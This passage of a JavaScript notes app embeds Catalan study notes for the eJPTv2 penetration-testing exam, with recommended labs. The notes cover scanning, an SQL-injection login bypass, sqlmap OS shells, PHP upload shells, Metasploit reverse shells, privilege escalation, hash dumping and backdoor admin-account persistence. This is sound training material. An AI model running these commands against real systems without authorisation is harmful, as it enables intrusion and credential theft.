- **Perill**: FTP envia contrasenyes en text pla. Si estàs esnifant la xarxa (Wireshark), bingo!

**3. Administració Remota (SSH/Telnet/RDP)**
- **SSH (22)**: Segur, però vulnerable a força bruta o claus privades robades.
- **Telnet (23)**: El dinosaure. Tot va en text pla. Si el veus, somriu.
- **RDP (3389)**: Escriptori remot de Windows. Vulnerable a força bruta i a vegades a exploits crítics (BlueKeep).

**4. Compartició d'Arxius (SMB)**
- **Ports**: 139, 445
- **El Rei de Windows**: SMB és crític. Aquí viuen els cucs (WannaCry) i les enumeracions més sucoses.
- **El teu objectiu**: Llistar carpetes compartides (shares), usuaris i buscar el famós "EternalBlue".

#### Adreçament IP: On estan els objectius?

No necessites ser un matemàtic, però necessites saber llegir una IP i una màscara de subxarxa per saber **com de gran és la xarxa que estàs atacant**.

**La xuleta ràpida (CIDR):**
- **/24** (ex. 192.168.1.0/24) -> La xarxa domèstica típica. **254** possibles víctimes.
- **/16** (ex. 10.0.0.0/16) -> Xarxa corporativa mitjana. **65,534** possibles víctimes.
- **/8** (ex. 10.0.0.0/8) -> Xarxa gegant. Milions d'IPs.

> **⚠️ Tip d'Examen**: Si et donen una IP com \`172.16.5.10/24\`, el teu primer pas és descobrir **qui més està en aquesta xarxa**. Un "Ping Sweep" et dirà quins altres veïns estan vius.

---

### 1.3 Sistemes Operatius: El Teu Entorn de Treball

Com a pentester, ets un amfibi. Necessites sobreviure tant a terra (Windows) com a l'aigua (Linux).

#### Linux: La Llar del Hacker

Gairebé totes les teves eines corren aquí (Kali, Parrot), i molts servidors que atacaràs són Linux.

**El que HAS de dominar:**
1.  **Permisos (\`chmod\`, \`chown\`)**:
    - \`rwx\`: Llegir, Escriure, Executar.
    - Si veus un arxiu amb permisos "raros" (ex. SUID), pot ser el teu bitllet a ser root.
2.  **Processos (\`ps aux\`)**:
    - Saber què està corrent et diu què fa el servidor. Hi ha un servidor web? Una base de dades?
3.  **Xarxa (\`ip addr\`, \`netstat\`)**:
    - Amb qui parla aquesta màquina? \`netstat -tulpn\` és el teu millor amic per veure ports oberts localment.

#### Windows: L'Objectiu Corporatiu

El món empresarial corre sobre Windows. Atacar-lo requereix entendre la seva lògica.

**Conceptes Clau:**
1.  **El Registre**: És el cervell de Windows. Conté configuracions, contrasenyes guardades i punts de persistència.
2.  **Usuaris i Grups**:
    - \`Administrator\`: Déu.
    - \`SYSTEM\`: Més que Déu (el propi sistema operatiu). El teu objectiu final.
3.  **CMD vs PowerShell**:
    - CMD és bàsic. PowerShell és **poderós**. Amb PowerShell pots interactuar amb tot el sistema operatiu, descarregar arxius i executar scripts complexos en memòria.

---

### 1.4 Resum i Següents Passos

No t'agobiïs memoritzant ports ara mateix. L'important és que entenguis la lògica:
- Les xarxes connecten coses.
- Els protocols són llenguatges.
- Els sistemes operatius gestionen els recursos.

Nosaltres, com a pentesters, busquem **fallades** en aquesta lògica, en aquests llenguatges i en aquesta gestió.

**Llest?** A la següent part, deixarem la teoria i començarem a "tocar" la xarxa. Anem a veure com descobrir què hi ha a l'altre costat del cable.

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part2.md"] = `## Part 2: Reconeixement i Enumeració

### 2.1 La Fase Més Important

T'ho diré clar: **Si falles aquí, falles en tot**.

El 80% de l'èxit en un pentest (i en l'examen eJPTv2) depèn de com de bé enumeris. Molts principiants llancen un escaneig ràpid, veuen un port 80 i corren a buscar vulnerabilitats web, ignorant que hi havia un port 445 (SMB) obert amb accés d'administrador.

**El teu mantra**: "Enumera fins que et faci mal, i després enumera una mica més".

---

### 2.2 Reconeixement Passiu (OSINT)

Abans de "tocar" l'objectiu, veurem què diu internet sobre ell. Això és com investigar algú a les xarxes socials abans d'una cita.

**Eines que has de conèixer:**

1.  **Google Dorks**:
    - No és només buscar. És buscar amb cirurgia.
    - \`site:empresa.com filetype:pdf\` -> Tenen manuals públics amb contrasenyes per defecte?
    - \`inurl:admin\` -> Panells d'administració exposats?

2.  **TheHarvester & Shodan**:
    - **TheHarvester**: Recol·lecta emails i subdominis. Els emails et donen el format d'usuari (ex: j.doe@empresa.com), vital per a atacs de força bruta després.
    - **Shodan**: El "Google dels hackers". Et diu quina tecnologia utilitza el servidor sense que tu li enviïs ni un sol paquet.

---

### 2.3 Reconeixement Actiu: Nmap és el teu Déu

Nmap no és una eina, és una extensió del teu cos. Has de saber utilitzar-lo adormit.

#### La Meva Metodologia d'Escaneig (Provada en Batalla)

No llancis un escaneig a la babalà. Segueix aquest ordre per no perdre temps:

**Pas 1: Qui està viu? (Ping Sweep)**
\`\`\`bash
nmap -sn 192.168.1.0/24
\`\`\`
*Traducció*: "Hola xarxa, qui està despert?". Això et dona la llista d'IPs objectiu.

**Pas 2: L'Escaneig Ràpid (Top 1000 ports)**
\`\`\`bash
nmap -sS --min-rate 5000 -p- 192.168.1.100
\`\`\`
*Traducció*: "Escaneja TOT molt ràpid". Volem saber quins ports estan oberts JA.

**Pas 3: L'Escaneig de Detall (Service & Scripts)**
\`\`\`bash
nmap -sC -sV -p 22,80,445 192.168.1.100 -oA escaneig_detall
\`\`\`
*Traducció*: "D'acord, he trobat el 22, 80 i 445. Ara digues-me QUINES versions corren i passa'ls els scripts per defecte".
- \`-sC\`: Scripts per defecte (vital, et troba logins anònims, títols web, etc).
- \`-sV\`: Versions (per buscar exploits després).
- \`-oA\`: **GUARDA SEMPRE L'OUTPUT**. Si no està documentat, no va succeir.

> **💡 Pro Tip: Scripts Específics**
> No et quedis només amb \`-sC\`. Utilitza scripts específics per al que trobis:
> - **SMB**: \`nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users IP\`
> - **HTTP**: \`nmap -p 80 --script http-enum,http-title,http-headers IP\`
> - **Vulns**: \`nmap --script vuln IP\` (Compte, és sorollós i pot trigar).

#### Anàlisi de Trànsit: Wireshark
A vegades, la resposta no està al servidor, sinó al cable.
- **Filtres Bàsics**:
    - \`ip.addr == 192.168.1.50\`: Només trànsit d'aquesta IP.
    - \`tcp.port == 80\`: Només trànsit web.
    - \`http.request.method == "POST"\`: Busca credencials enviades en formularis.

---

### 2.4 Enumeració de Serveis: Aprofundint

Nmap et diu "La porta està oberta". Ara toca entrar i mirar els mobles.

#### SMB (Port 445/139) - El Tresor
Si veus això a Windows, **és la teva prioritat #1**.
- **Eina**: \`enum4linux -a IP\`
- **Què busques**:
    - **Null Sessions**: Pots entrar sense usuari ni contrasenya?
    - **Shares**: Hi ha carpetes compartides amb noms com "Backup", "Passwords" o "Private"?
    - **Usuaris**: Llista d'usuaris per a força bruta.

#### HTTP/HTTPS (Port 80/443) - La Jungla
La web és immensa. No et perdis navegant sense rumb.
1.  **Tecnologies**: \`whatweb http://IP\` -> És un WordPress? Un Apache vell?
2.  **Directoris Ocults**: \`gobuster dir -u http://IP -w common.txt\` -> Busca \`/admin\`, \`/backup\`, \`/config\`.
    - *Pro Tip*: Busca sempre extensions: \`-x php,txt,html\`. A vegades \`config.php.bak\` és la clau del regne.

#### Altres Sospitosos Habituals
- **FTP (21)**: Prova sempre usuari \`anonymous\` i contrasenya buida.
- **SSH (22)**: Rarament vulnerable a exploits. Prova força bruta (Hydra) si tens usuaris, o busca claus privades robades.
- **SQL (3306/1433)**: Obert a l'exterior? Prova credencials per defecte (\`root:root\`, \`sa:password\`).

---

### 2.5 Resum

1.  **No et precipitis**. Pren-te el teu temps enumerant.
2.  **Documenta**. Anota cada port, cada versió i cada cosa rara que vegis.
3.  **Organitza**. Si trobes un usuari a SMB, prova'l a SSH i al Login Web. Tot està connectat.

### 2.6 Checklist d'Enumeració (No et deixis res)
- [ ] **Ping Sweep**: Tinc totes les IPs?
- [ ] **Nmap Complet**: He escanejat els 65535 ports TCP? I el top 20 UDP?
- [ ] **Versions**: Sé quin software corre a cada port?
- [ ] **Scripts**: He llançat \`--script vuln\` o scripts específics (smb, http)?
- [ ] **Web**: He buscat directoris ocults, subdominis i tecnologies?
- [ ] **SMB**: He provat sessions nul·les i llistat shares?

### 2.7 Troubleshooting: Per què no veig res?
- **El host no respon?**: Prova \`-Pn\` (tractar com online) o \`-PE\` (ICMP echo).
- **L'escaneig és molt lent?**: Utilitza \`--min-rate 5000\`.
- **Resultats raros?**: Pot haver-hi un Firewall/WAF. Prova a fragmentar paquets (\`-f\`) o canviar l'MTU (\`--mtu 24\`).

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part3.md"] = `## Part 3: Tècniques d'Explotació

### 3.1 Entrant al Sistema

Ja has enumerat. Saps que hi ha un servidor web Apache vulnerable o un Windows amb SMB obert. Ara toca **trencar la porta**.

Però ull: **No llancis exploits a la babalà**. Un exploit fallit pot tombar el servidor (DoS) i alertar a tothom. Entén què vas a llançar.

---

### 3.2 Vulnerabilitats Web: Preguntant i Executant

La majoria dels atacs web es resumeixen en: "La web confia massa en el que jo escric".

#### SQL Injection (SQLi): Interrogant la Base de Dades
Imagina que la web té un porter.
- Tu: "Vull entrar".
- Porter: "Usuari?".
- Tu: "Soc en Joan".
- Porter: "Passa".

Ara SQLi:
- Tu: "Soc en Joan **O** soc qualsevol si 1 és igual a 1".
- Porter (Base de dades confosa): "Ah, 1 és igual a 1... doncs passa".

**Eines**:
- **Manual**: Prova sempre \`' OR 1=1--\` en logins.
- **Automàtic**: \`sqlmap\`. És màgia negra.
    - \`sqlmap -u "http://web.com?id=1" --dbs\` -> "Digues-me quines bases de dades tens".
    - \`sqlmap -u "..." --os-shell\` -> "Dona'm una terminal al servidor". **(El Sant Grial)**.

#### Cross-Site Scripting (XSS): Atacant a l'Usuari
Aquí no ataques el servidor, ataques a **qui visita la web**.
- Injectes codi JavaScript maliciós.
- Quan l'admin entra, el seu navegador executa el teu codi.
- **Objectiu**: Robar la seva cookie de sessió (\`document.cookie\`). Amb aquesta cookie, **tu ets l'admin**.

#### File Upload: La Porta del Darrere
Si una web et deixa pujar fotos de perfil... què passa si puges un arxiu \`.php\` maliciós?
- Puges \`shell.php\`.
- Visites \`http://web.com/uploads/shell.php\`.
- Boom! El servidor executa el teu codi.

---

### 3.3 Metasploit: La Teva Navalla Suïssa

Molts odien Metasploit perquè diuen que és de "script kiddies". **Fals**. És una eina professional potent. Utilitza-la, però entén què fa.

**Flux de treball típic:**
1.  **Buscar**: \`search eternalblue\`
2.  **Seleccionar**: \`use exploit/windows/smb/...\`
3.  **Configurar**:
    - \`set RHOSTS IP_VICTIMA\` (A qui ataques)
    - \`set LHOST LA_TEVA_IP\` (A on torna la connexió - **IMPORTANT**)
4.  **Disparar**: \`exploit\`

> **⚠️ Nota**: Si Metasploit falla, llegeix l'error. A vegades és tan simple com canviar l'\`LHOST\` o el \`TARGET\`.

#### Payloads: Què li envio?
No tots els payloads són iguals.
- **Staged** (\`windows/meterpreter/reverse_tcp\`): Envia un tros petit primer, que després descarrega la resta. Menys estable però cap en llocs petits.
- **Non-Staged** (\`windows/meterpreter_reverse_tcp\`): Envia TOT el codi d'una. Més estable i segur, però pesa més. **Utilitza'l si l'staged falla**.

#### Pivoting: Saltant de màquina en màquina
A l'examen, a vegades compromets una màquina (A) que té accés a una xarxa interna (B) que tu no veus.
1.  **Autoroute**: A Meterpreter, utilitza \`run autoroute -s 10.0.0.0/24\`. Ara MSF "veu" aquesta xarxa.
2.  **Proxychains**:
    - Utilitza el mòdul \`auxiliary/server/socks_proxy\`.
    - Configura \`/etc/proxychains.conf\` amb el port del proxy.
    - Executa eines fora de MSF: \`proxychains nmap ...\`

---

### 3.4 Shells: L'Art de Connectar

Quan explotes alguna cosa, vols control. Vols una **Shell**.

**Reverse Shell (La més comuna)**
Tu esperes (escoltes) i obligues la víctima a connectar-se a tu. Ideal per saltar-se Firewalls (que solen bloquejar connexions entrants però permeten sortints).
1.  Tu: \`nc -lvnp 4444\` (Escolto al port 4444).
2.  Víctima: Executa codi que diu "Connecta't a la IP de l'atacant al port 4444 i dona-li una terminal".

**Bind Shell**
La víctima obre un port i tu et connectes a ell. Menys comú perquè els Firewalls solen bloquejar-ho.

**Estabilitzar la teva Shell (Vital)**
Quan aconsegueixes una shell amb Netcat, és "tonta". No té historial, ni autocompletat, i si fas Ctrl+C es mor.
**Truc de l'Almendruco**:
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`
(Després Ctrl+Z, \`stty raw -echo; fg\`, Enter, Enter). Ara tens una terminal de veritat!

---

### 3.5 Resum

L'explotació no és màgia. És trobar una peça de software mal feta i utilitzar-la perquè faci el que tu vols.
- **Web**: SQLi, XSS, Uploads.
- **Xarxa**: Exploits coneguts (EternalBlue), Força Bruta.
- **Objectiu final**: Aconseguir una Shell (accés de línia de comandes).

Un cop dins... comença la veritable diversió (Post-Explotació).

### 3.6 Checklist d'Explotació
- [ ] **Investigació**: He buscat l'exploit exacte per a la versió exacta?
- [ ] **Configuració**: He revisat LHOST, RHOST i LPORT tres vegades?
- [ ] **Payload**: He provat Staged i Non-Staged?
- [ ] **Arquitectura**: Estic llançant un payload x64 a un Windows x86? (Error comú).

### 3.7 Troubleshooting: Metasploit falla
- **"Exploit completed, but no session was created"**:
    - El teu exploit ha funcionat, però el payload no ha pogut connectar de tornada.
    - Causa 1: Firewall bloqueja la connexió entrant -> Utilitza un port comú (80, 443).
    - Causa 2: Payload incorrecte (x64 vs x86).
    - Causa 3: La víctima no té sortida a internet (rar a l'examen, possible a la vida real).
- **"Connection refused"**:
    - El servei està caigut o el port està tancat.
    - Has tombat el servei amb un intent anterior? Reinicia la màquina si pots.

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part4.md"] = `## Part 4: Post-Explotació i Escalada de Privilegis

### 4.1 Ja estic dins... i ara què?

Felicitats, tens una shell. Però probablement ets \`www-data\` o un usuari sense poders. No pots llegir \`/etc/shadow\`, no pots bolcar hashes i no pots instal·lar eines.

**La teva missió ara és convertir-te en Déu (Root/SYSTEM).**

---

### 4.2 Escalada a Linux: Buscant l'Error Humà

A Linux, rarament escales per un "exploit màgic" del kernel (encara que passa, com DirtyCow). El normal és escalar perquè **l'administrador va cometre un error**.

#### 1. Sudo: L'error més comú
El primer que escric en qualsevol shell nova:
\`\`\`bash
sudo -l
\`\`\`
Si veus \`(ALL) NOPASSWD: /usr/bin/vim\`, ja ets root!
- **Per què?** Perquè Vim et deixa executar comandes de sistema.
- **Truc**: Visita [GTFOBins](https://gtfobins.github.io/). És la bíblia per a això. Busques "vim", prems "Sudo" i copies la comanda.

#### 2. SUID: Els permisos perillosos
Els arxius SUID s'executen amb els permisos del seu *amo* (generalment root), no de l'*usuari* que els llança.
- **Comanda de cerca**:
  \`\`\`bash
  find / -perm -4000 -type f 2>/dev/null
  \`\`\`
- Si veus \`/usr/bin/python\` amb SUID... felicitats. Pots fer que Python generi una shell de root.

#### 3. Tasques Cron: L'script oblidat
A vegades hi ha scripts que s'executen cada minut com a root. Si tu pots *escriure* en aquest script... pots posar el teu codi maliciós i esperar un minut.
- **Comanda**: \`cat /etc/crontab\` o utilitza **LinPEAS**.

#### Eina Estrella: LinPEAS
No perdis temps buscant a mà.
1.  Puja \`linpeas.sh\` a la víctima.
2.  Executa'l: \`./linpeas.sh\`.
3.  Mira els colors: **Vermell/Groc** = 99% probabilitat d'escalada.

#### Enumeració Manual (Living off the Land)
A vegades no pots pujar eines. Aprèn a mirar tu mateix:
- \`uname -a\`: Versió del kernel (DirtyCow?).
- \`cat /etc/passwd\`: Usuaris del sistema.
- \`id\`: Qui ets i en quins grups estàs? (lxd, docker són perillosos).
- \`history\`: L'admin va escriure contrasenyes abans?
- \`netstat -antup\`: Què corre internament?

---

### 4.3 Escalada a Windows: El Laberint

Windows és més complex i sorollós. Aquí busquem serveis mal configurats.

#### 1. Unquoted Service Paths (El clàssic)
Un servei corre a \`C:\\Program Files\\Mi Programa\\service.exe\`.
Nota que hi ha espais i no hi ha cometes. Windows intentarà executar:
1.  \`C:\\Program.exe\` (Si tu poses un virus aquí, s'executa com SYSTEM!)
2.  \`C:\\Program Files\\Mi.exe\`
3.  ...

#### 2. AlwaysInstallElevated
Una política que permet a QUALSEVOL usuari instal·lar arxius \`.msi\` com SYSTEM.
- **Atac**: Crees un MSI maliciós amb \`msfvenom\` i l'instal·les. Boom, shell de SYSTEM.

#### 3. Secrets a la pols
Els admins són ganduls. Deixen contrasenyes a:
- Scripts d'instal·lació (\`Unattend.xml\`).
- Historial de PowerShell.
- Arxius de configuració web (\`web.config\`).

#### Eina Estrella: WinPEAS
Igual que a Linux. Descarrega \`winpeas.exe\`, executa'l i busca el vermell.

#### Enumeració Manual a Windows
- \`whoami /priv\`: Tens \`SeImpersonatePrivilege\`? (JuicyPotato).
- \`net user\`: Llista usuaris.
- \`net localgroup Administrators\`: Qui és admin?
- \`ipconfig /all\`: En quina xarxa estàs? Qui és el DNS?
- \`cmdkey /list\`: Hi ha credencials guardades?

---

### 4.4 Saqueig (Looting) i Persistència

Un cop ets Root/SYSTEM, el joc no acaba.
1.  **Bolcar Hashes**:
    - Linux: \`cat /etc/shadow\`
    - Windows: Mimikatz o \`hashdump\` a Meterpreter.

2.  **Persistència**:
    - Vols haver de tornar a explotar la fallada demà? No.
    - Crea un usuari nou: \`net user hacker password123 /add\` i \`net localgroup Administrators hacker /add\`.
    - O deixa una tasca programada que t'enviï una shell cada hora.

---

### 4.5 Resum

L'escalada de privilegios és un art d'**enumeració interna**.
- No busquis exploits complexos al principi.
- Busca **errors de configuració** (permisos febles, passwords en text pla).
- Utilitza scripts d'enumeració (**LinPEAS/WinPEAS**) per estalviar temps, però **entén el que et diuen**.

### 4.6 Checklist de PrivEsc
- [ ] **Linux**:
    - [ ] \`sudo -l\`
    - [ ] SUID binaries (\`find / -perm -4000\`)
    - [ ] Crontabs (\`/etc/crontab\`)
    - [ ] Kernel Version (\`uname -a\`)
    - [ ] LinPEAS (Alguna cosa vermella?)
- [ ] **Windows**:
    - [ ] \`whoami /priv\` (SeImpersonate?)
    - [ ] Unquoted Service Paths
    - [ ] AlwaysInstallElevated
    - [ ] WinPEAS (Alguna cosa vermella?)

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part5.md"] = `## Part 5: El Teu Arsenal d'Eines

### 5.1 No siguis un "Tool Kiddie"

Un "Tool Kiddie" llança eines sense saber què fan. Un Hacker sap quina eina utilitzar, quan i amb quins flags.

Aquí tens la meva selecció personal per a l'eJPTv2, organitzades per funció.

---

### 5.2 Escaneig i Enumeració

**Nmap (El Rei)**
- **Ús**: Tot. Descobriment, ports, serveis, scripts.
- **Pro Tip**: Utilitza \`-oA\` sempre. Si Nmap triga molt, utilitza \`--min-rate 2000\`, però compte amb saturar la xarxa.

**Masscan / Rustscan**
- **Ús**: Quan tens pressa o moltes IPs. Són molt més ràpids que Nmap però menys precisos.
- **Estratègia**: Utilitza Masscan per trobar ports oberts ràpid, i després Nmap NOMÉS a aquests ports per veure versions.

**Gobuster / Ffuf**
- **Ús**: Força bruta de directoris web i subdominis.
- **Pro Tip**: La wordlist importa més que l'eina. Utilitza \`directory-list-2.3-medium.txt\` de SecLists. És la vella fiable.

---

### 5.3 Força Bruta i Cracking

**Hydra**
- **Ús**: Endevinar contrasenyes en serveis vius (SSH, FTP, RDP, Login Web).
- **Compte**: És sorollós i lent. Utilitza'l només si tens un usuari vàlid i vols la password.

**John the Ripper / Hashcat**
- **Ús**: Trencar hashes que ja has robat (offline).
- **Diferència**:
    - **John**: Fàcil d'utilitzar, detecta formats automàticament. Bo per a CPU.
    - **Hashcat**: La bèstia. Difícil d'aprendre, però si tens targeta gràfica (GPU), vola.

---

### 5.4 Explotació i Shells

**Metasploit Framework (MSF)**
- **Ús**: Tot en un. Exploits, payloads, listeners, post-explotació.
- **Pro Tip**: Utilitza \`workspaces\` dins de msfconsole per organitzar les teves IPs si ataques diverses màquines.

**Netcat (nc)**
- **Ús**: La navalla suïssa. Transferir arxius, xat simple, escaneig de ports manual i, sobretot, **Reverse Shells**.
- **Comanda de vida o mort**: \`nc -lvnp 4444\`. Tatua-te-la.

**Burp Suite**
- **Ús**: Interceptar i modificar trànsit web.
- **Imprescindible per a**: SQLi manual, veure paràmetres ocults, repetir peticions (Repeater). La versió Community és suficient per a eJPT.

---

### 5.5 Post-Explotació

**LinPEAS / WinPEAS**
- **Ús**: Scripts que busquen vectors d'escalada de privilegis automàticament.
- **Consell**: La sortida és gegant. Aprèn a llegir-la. El vermell/groc és l'important. Ignora el soroll.

**Mimikatz**
- **Ús**: Extreure contrasenyes en text pla i hashes de la memòria de Windows.
- **Perill**: Els antivirus l'odien. A l'eJPTv2 no hi ha AV, així que gaudeix.

---

### 5.6 Resum

No necessites 100 eines. Necessites dominar aquestes 10.
- **Xarxa**: Nmap, Netcat.
- **Web**: Gobuster, Burp Suite.
- **Atac**: Metasploit, Hydra.
- **Post**: PEAS, John/Hashcat.

Amb això, pots hackejar gairebé qualsevol cosa al nivell Junior/Mid.

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part6.md"] = `## Part 6: Laboratoris Recomanats
 
 ### 6.1 La Pràctica Fa al Mestre
 
 En lloc de donar-te solucions pas a pas que copiaràs sense pensar, et recomanaré **Laboratoris Reals** (gratuïts en la seva majoria) que simulen perfectament l'entorn de l'eJPTv2.
 
 La teva missió: **Hackejar-los sense mirar writeups** (almenys intenta-ho 1 hora).
 
 ---
 
 ### 6.2 Nivell 1: Escalfament (TryHackMe)
 
 #### [Blue](https://tryhackme.com/room/blue)
 - **Objectiu**: Explotar la vulnerabilitat més famosa de la història (EternalBlue).
 - **Skills**: Nmap scripting, Metasploit, Windows.
 - **Repte**: Intenta fer-ho manual (sense Metasploit) després de fer-ho amb MSF.
 
 #### [Ice](https://tryhackme.com/room/ice)
 - **Objectiu**: Explotar un servei mal configurat a Windows.
 - **Skills**: RDP, Metasploit, Escalada de privilegis bàsica.
 
 ---
 
 ### 6.3 Nivell 2: La Realitat (TryHackMe)
 
 #### [Blaster](https://tryhackme.com/room/blaster)
 - **Objectiu**: Un entorn Windows modern amb IIS.
 - **Skills**: Enumeració web, Metasploit, Persistència.
 
 #### [Ignite](https://tryhackme.com/room/ignite)
 - **Objectiu**: Un CMS vulnerable (Fuel CMS).
 - **Skills**: Searchsploit, RCE manual, Linux PrivEsc.
 
 ---
 
 ### 6.4 Nivell 3: Simulacre d'Examen
 
 #### [Wreath](https://tryhackme.com/room/wreath) (Xarxa Completa)
 - **Objectiu**: Això és el més semblant a l'eJPTv2. Una xarxa amb diverses màquines, pivoting i moviment lateral.
 - **Skills**: Pivoting (Sshuttle/Proxychains), Evasió, Escalada complexa.
 - **Nota**: És llarg, però val or.
 
 [⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part7.md"] = `## Part 7: Sobrevivint a l'Examen eJPTv2

### 7.1 No és un Examen, és una Feina

L'eJPTv2 no et demana que responguis A, B o C. Et dona una carta de contractació: "Aquí tens una xarxa corporativa. Hackeja-la i digues-me què has trobat".

Tens **48 hores**. És temps de sobres. No entris en pànic.

---

### 7.2 Estratègia de Combat

#### Fase 1: El Mapeig (Hores 0-2)
No ataquís res. Només mira.
- Llança un Ping Sweep per veure totes les màquines.
- Fes un diagrama (paper i boli). "La IP .10 és el servidor web, la .20 sembla un controlador de domini".
- **Objectiu**: Entendre la xarxa.

#### Fase 2: L'Enumeració Profunda (Hores 2-10)
Tria la màquina més fàcil (normalment la que té més ports oberts o serveis web vells).
- Enumera a mort.
- Pren notes de TOT. "Port 80: Apache 2.4. Port 445: Windows 10".

#### Fase 3: L'Atac (Hores 10-...)
- Has trobat un exploit per a aquesta versió d'Apache? Llança'l.
- Has trobat usuaris a SMB? Fes força bruta a l'SSH.
- Si t'encalles més d'1 hora en una màquina, **canvia't a una altra**. A vegades necessites informació de la Màquina B per hackejar la Màquina A.

---

### 7.3 Consells Psicològics

1.  **L'Enumeració és la Clau**: Si no trobes la vulnerabilitat, és perquè no has enumerat bé. Torna a escanejar. Busca ports UDP. Busca a tots els ports (1-65535).
2.  **Descansa**: El teu cervell no funciona bé després de 8 hores seguides. Dorm. Menja. Surt a caminar. L'examen dura 2 dies.
3.  **Metasploit és el teu Amic**: Utilitza'l. No et donen punts extra per fer-ho "a mà". Si hi ha un mòdul de Metasploit, utilitza'l.
4.  **Les Preguntes són Pistes**: Llegeix les preguntes de l'examen. A vegades et pregunten "Quin és el contingut de l'arxiu secret.txt a l'escriptori de l'Administrator?". T'estan dient que l'objectiu és arribar a l'escriptori de l'Administrator!

---

### 7.4 El que NO has de fer

- **No et rendeixis**. Si et bloqueges, respira.
- **No compliquis les coses**. La solució sol ser senzilla. No busquis un 0-day al kernel si la contrasenya de l'admin és "admin123".
- **No oblidis les captures de pantalla**. Necessites proves.

[⬆️ Tornar a l'inici](README.md)`;

notesData.ca["part8.md"] = `## Part 8: Recursos i Comiat

### 8.1 La Teva Motxilla de Viatge

No vagis sol. Aquí tens els recursos que jo utilitzo dia a dia.

**Referències Tècniques (La Bíblia)**
- **[HackTricks](https://book.hacktricks.xyz/)**: Si existeix una forma de hackejar-ho, està aquí. És la teva referència #1.
- **[GTFOBins](https://gtfobins.github.io/)**: Per escalar privilegis a Linux.
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**: Cheatsheets per a tot (SQLi, XSS, Reverse Shells).

**Entrenament (El Gimnàs)**
- **TryHackMe**: Comença per aquí. Rutes guiades. "Jr Penetration Tester" és or pur.
- **HackTheBox**: Quan et sentis valent. Màquines més reals i difícils.

**Eines (El Taller)**
- **SecLists**: La millor col·lecció de diccionaris (usuaris, passwords, rutes web). \`apt install seclists\`.

---

### 8.2 Un Missatge Final

Arribar fins aquí demostra que tens la curiositat i la disciplina necessàries. El hacking no és per a gent que es rendeix al primer error. És per a gent que veu un error i diu "Per què ha passat això?" i segueix investigant.

Aquesta guia és un resum de la meva experiència. Utilitza-la, millora-la i, sobretot, **comparteix-la**. El coneixement creix quan es comparteix.

Molta sort en el teu examen. Ens veiem al costat Root.

**- JotaTito05** 🏴‍☠️

[⬆️ Tornar a l'inici](README.md)`;

// Hardcoded structure of your notes
// Sidebar Structure Data
const sidebarData = {
    es: [
        { title: "Inicio", path: "README.md" },
        { title: "Parte 1: Fundamentos", path: "part1.md" },
        { title: "Parte 2: Reconocimiento", path: "part2.md" },
        { title: "Parte 3: Explotación", path: "part3.md" },
        { title: "Parte 4: Post-Explotación", path: "part4.md" },
        { title: "Parte 5: Herramientas", path: "part5.md" },
        { title: "Parte 6: Ejercicios", path: "part6.md" },
        { title: "Parte 7: Examen", path: "part7.md" },
        { title: "Parte 8: Recursos", path: "part8.md" },
        { title: "Parte 9: Cheatsheet", path: "part9.md" }
    ],
    en: [
        { title: "Home", path: "README.md" },
        { title: "Part 1: Fundamentals", path: "part1.md" },
        { title: "Part 2: Reconnaissance", path: "part2.md" },
        { title: "Part 3: Exploitation", path: "part3.md" },
        { title: "Part 4: Post-Exploitation", path: "part4.md" },
        { title: "Part 5: Tools", path: "part5.md" },
        { title: "Part 6: Exercises", path: "part6.md" },
        { title: "Part 7: Exam", path: "part7.md" },
        { title: "Part 8: Resources", path: "part8.md" },
        { title: "Part 9: Cheatsheet", path: "part9.md" }
    ],
    ca: [
        { title: "Inici", path: "README.md" },
        { title: "Part 1: Fonaments", path: "part1.md" },
        { title: "Part 2: Reconeixement", path: "part2.md" },
        { title: "Part 3: Explotació", path: "part3.md" },
        { title: "Part 4: Post-Explotació", path: "part4.md" },
        { title: "Part 5: Eines", path: "part5.md" },
        { title: "Part 6: Exercicis", path: "part6.md" },
        { title: "Part 7: Examen", path: "part7.md" },
        { title: "Part 8: Recursos", path: "part8.md" },
        { title: "Part 9: Cheatsheet", path: "part9.md" }
    ]
};

// Use Spanish structure as default for logic (findNextNote)
const notesStructure = sidebarData.es;

// Initialize Marked
marked.use({
    highlight: function (code, lang) {
        const language = hljs.getLanguage(lang) ? lang : 'plaintext';
        return hljs.highlight(code, { language }).value;
    },
    langPrefix: 'hljs language-'
});

// Custom renderer for Alerts
const renderer = {
    blockquote(quote) {
        // Simple heuristic to detect alerts
        const text = quote.text || quote; // marked version differences
        if (text.includes('<strong>Note</strong>') || text.includes('[!NOTE]')) return createAlert('note', text);
        if (text.includes('<strong>Tip</strong>') || text.includes('[!TIP]')) return createAlert('tip', text);
        if (text.includes('<strong>Important</strong>') || text.includes('[!IMPORTANT]')) return createAlert('important', text);
        if (text.includes('<strong>Warning</strong>') || text.includes('[!WARNING]')) return createAlert('warning', text);
        if (text.includes('<strong>Caution</strong>') || text.includes('[!CAUTION]')) return createAlert('caution', text);

        return `<blockquote>${text}</blockquote>`;
    }
};

function createAlert(type, content) {
    // Clean the [!TYPE] tag from content
    const cleanContent = content.replace(/\[!.*?\]/g, '').replace(/<p>/, '').replace(/<\/p>/, '');
    return `
    <div class="markdown-alert markdown-alert-${type}">
        <span class="markdown-alert-title">${type.toUpperCase()}</span>
        ${cleanContent}
    </div>
    `;
}

marked.use({ renderer });


// DOM Elements
const navTree = document.getElementById('nav-tree');
const contentArea = document.getElementById('content-area');

// Render Sidebar
function renderSidebar() {
    // Clear existing sidebar
    navTree.innerHTML = '';

    // Get structure for current language
    const currentStructure = sidebarData[currentLang] || sidebarData.es;

    currentStructure.forEach(item => {
        if (item.children) {
            // Group Header
            const header = document.createElement('div');
            header.className = 'nav-group-title';
            header.textContent = item.title;
            navTree.appendChild(header);

            // Children
            item.children.forEach(child => {
                createNavLink(child.title, child.path);
            });
        } else {
            // Root Item
            createNavLink(item.title, item.path);
        }
    });
}

function createNavLink(title, path) {
    const link = document.createElement('div');
    link.className = 'nav-item';

    const a = document.createElement('a');
    a.className = 'nav-link';
    a.textContent = title;
    a.dataset.path = path;

    a.addEventListener('click', (e) => {
        e.preventDefault();
